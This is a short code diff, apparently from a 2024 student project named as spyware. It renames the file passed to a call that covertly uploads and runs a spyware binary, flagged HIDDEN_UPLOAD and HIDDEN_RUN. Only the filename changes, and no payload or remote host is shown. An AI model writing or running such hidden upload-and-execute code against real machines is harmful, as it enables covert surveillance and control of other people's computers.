@@ -39,7 +39,7 @@ def main():
         agent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "/home/avner/Arazim-Projects-2024---spyware/spyware",
-            "sentSpyware.spy",
+            "sentSpyware2.spy",
         )
     )
 
